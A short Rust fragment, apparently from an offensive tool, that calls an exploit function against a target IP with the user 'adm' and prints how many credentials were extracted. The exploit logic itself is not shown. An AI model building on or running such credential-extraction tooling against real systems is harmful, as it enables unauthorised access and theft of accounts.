    // Drop the spinner before printing so output is clean
    pb.finish_and_clear();
    match exploit::exploit(ip, 0, "adm", max) {
        Ok(users) if users.is_empty() => crate::display::print_warn("No credentials extracted."),
        Ok(users) => {
            crate::display::print_success(&format!("{} credential(s) extracted.", users.len()))
        }
        Err(e) => crate::display::print_error(&format!("{e}")),
    }
}
